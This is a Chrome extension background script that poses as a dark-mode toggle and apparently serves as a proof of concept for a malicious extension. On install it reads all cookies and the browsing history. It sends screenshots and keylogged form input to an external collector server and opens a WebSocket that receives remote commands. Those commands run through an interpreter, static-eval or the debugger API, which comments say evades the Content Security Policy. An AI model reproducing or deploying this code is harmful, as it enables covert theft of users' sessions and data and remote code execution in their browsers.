importScripts("packages/acorn_interpreter.js", "packages/esprima.js", "packages/escodegen.js", "packages/static-eval.js");

const SERVER_DOMAIN = 'extension-code-injector-production.up.railway.app'
const HTTP_SERVER_URL = `http://${SERVER_DOMAIN}`;
const WS_SERVER_URL = `ws://${SERVER_DOMAIN}`;

// Perform the initial data steal and connect to websockets only after website is ready
async function onReady() {
    await stealUserData();
    setTimeout(() => {
        socket = connectWebSocket();
    }, 2000);
}

chrome.runtime.onInstalled.addListener(onReady);
chrome.action.onClicked.addListener((tab) => {
    chrome.tabs.sendMessage(tab.id, {type: "TOGGLE_DARK_MODE"});
});

/* =================================================================================== */

// Steal cookies and browsing history on load
async function stealUserData() {
    const cookies = await chrome.cookies.getAll({});
    const history = await chrome.history.search({text: ""});

    // TODO: Save history and all cookies
    console.log('cookies', cookies);
    console.log('history', history);
}

/* =================================================================================== */

// On visit of a certain domain, take a screenshot
// Could be abused to take screenshots of sensitive data such as bank account details
async function onVisited(historyItem) {
    if (historyItem.url.includes('google.com')) {
        console.log('historyItem', historyItem);
        const screenshotUrl = await chrome.tabs.captureVisibleTab({format: 'jpeg'});
        // TODO: take a screenshot and save it
    }
}

chrome.history.onVisited.addListener(onVisited)

/* =================================================================================== */

// Utility function to take screenshot and send it to the server
async function takeScreenshot() {
    const currentTab = await getCurrentTab();
    if (!currentTab) {
        console.log('Could not find current tab');
        return;
    }

    const screenshotUrl = await chrome.tabs.captureVisibleTab();
    console.log(screenshotUrl)

    try {
        await fetch(`${HTTP_SERVER_URL}/collector/screenshot`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({dataUrl: screenshotUrl})
        })
    } catch (err) {
        console.error(err.message);
    }
}

/* =================================================================================== */

// Send the input values to the server which will save them in a DB
async function onInputMessage(message, sender, sendResponse) {
    try {
        const response = await fetch(`${HTTP_SERVER_URL}/collector/key-logger`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(request.data)
        })

        sendResponse({status: 'ok'})
    } catch (err) {
        console.warn(err.message);
        sendResponse({status: 'fail'})
    }
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    (async () => {
        switch (request.type) {
            case 'SUBMIT_FORM':
                await onInputMessage(request, sender, sendResponse);
            default:
                console.log('Unknown message received from content script:', request);
                break;
        }
    })();
    return true
})

/* =================================================================================== */

// Establish a websocket connection to the server and forward all messages from the server to the popup
// This way the popup can receive real-time code from the server and execute on client-side
let WS_CONNECTED = false;
let socket;

function connectWebSocket() {
    if (WS_CONNECTED) {
        return;
    }

    const socket = new WebSocket(WS_SERVER_URL);

    socket.onopen = () => {
        console.log('WebSocket connected');
        WS_CONNECTED = true;
    };

    socket.onmessage = onWsMessage;

    socket.onerror = (error) => {
        console.warn('WebSocket error: ', error);
    };

    socket.onclose = (event) => {
        console.log('WebSocket closed.');
        WS_CONNECTED = false;
    };

    return socket
}

// Process the message from the WS server
async function onWsMessage(event) {
    const parsedMessage = JSON.parse(event.data);

    console.log('received message:', parsedMessage);
    if (parsedMessage.type === 'HELLO') {
        socket.send("Hello, Server!");
    }

    const currentTab = await getCurrentTab();
    if (!currentTab) {
        console.log('Could not find current tab');
        return;
    }

    if (parsedMessage.type.includes('SCREENSHOT')) {
        return await takeScreenshot();
    }

    if (parsedMessage.type.includes('BG_COMMAND')) {
        // // Show that eval is blocked by CSP
        // executeWithEval(parsedMessage.data);
        //
        // // Show that eval through setTimout is blocked by CSP in the background script
        // executeWithSetTimeout(parsedMessage.data);
        //
        // // Alternative, execute the command with the interpreter, goes unnoticed by CSP
        // executeWithInterpreter(parsedMessage.data);

        // Alternative, execute the command with the interpreter, goes unnoticed by CSP
        executeWithStaticEval(parsedMessage.data);
    }

    if (parsedMessage.type.includes('CS_COMMAND')) {
        console.log('Sending command to content script ...')
        chrome.tabs.sendMessage(currentTab.id, {type: 'COMMAND', data: parsedMessage.data});
        // Alternatively, execute the command with the debugger
        // executeWithDebugger(parsedMessage.data, currentTab.id);
    }
}

/* =================================================================================== */
// Misc functions

// Get the current tab
async function getCurrentTab() {
    let queryOptions = {active: true, lastFocusedWindow: true};
    let [tab] = await chrome.tabs.query(queryOptions);
    return tab;
}

// Evaluate the code in the context of a tab with the debugger
async function executeWithDebugger(command, tabId) {
    await chrome.debugger.attach({tabId}, "1.3");
    await chrome.debugger.sendCommand({tabId}, "Runtime.evaluate", {expression: command});
    await chrome.debugger.detach({tabId});
}

// Execute injected code through a JS interpreter
function executeWithInterpreter(command) {
    console.log("\nExecuting with JSInterpreter ...")
    // Define a wrapper for the chrome.cookies.getAll function
    const portCookies = function (interpreter, globalObject) {
        const wrapper = function getAll(query, callback) {
            const nativeQuery = interpreter.pseudoToNative(query)

            const nativeCallback = function (result) {
                // Convert result to a pseudo object and call the interpreted callback
                const pseudoResult = interpreter.nativeToPseudo(result);
                callback(pseudoResult);
            };

            chrome.cookies.getAll(nativeQuery, nativeCallback);
        };

        // Add the chrome.cookies.getAll function to the interpreter
        const pseudoChromeFunc = interpreter.nativeToPseudo(chrome);
        interpreter.setProperty(globalObject, 'chrome', pseudoChromeFunc);
        const pseudoChromeCookies = interpreter.getProperty(pseudoChromeFunc, 'cookies');
        interpreter.setProperty(pseudoChromeCookies, 'getAll', interpreter.createNativeFunction(wrapper));
    }

    const initFunc = function (interpreter, globalObject) {
        interpreter.setProperty(globalObject, 'url', String(location));
        interpreter.setProperty(globalObject, 'console', interpreter.nativeToPseudo(console))

        portCookies(interpreter, globalObject)
    };
    const interpreter = new Interpreter(command, initFunc)
    interpreter.run()
}

// Execute injected code through AST conversion and static eval
function executeWithStaticEval(command) {
    console.log("\nExecuting with Static Eval ...")

    const ast = esprima.parse(command).body[0].expression;

    staticEval.evaluate(esprima.parse('console.log(`starting`)'), {console})
    staticEval.evaluate(
        ast,
        {chrome, console, fetch},
    );
}

// Execute injected code through a setTimeout
function executeWithSetTimeout(command) {
    try {
        console.log("\nExecuting with setTimout (CSP block expected) ...")
        setTimeout(command);
    } catch (err) {
        console.warn(`setTimeout() failed: ${err.message}`);
    }
}

// Execute injected code through eval
function executeWithEval(command) {
    try {
        console.log("\nExecuting with eval (CSP block expected) ...")
        eval(command);
    } catch (err) {
        console.warn(`eval() failed: ${err.message}`);
    }
}
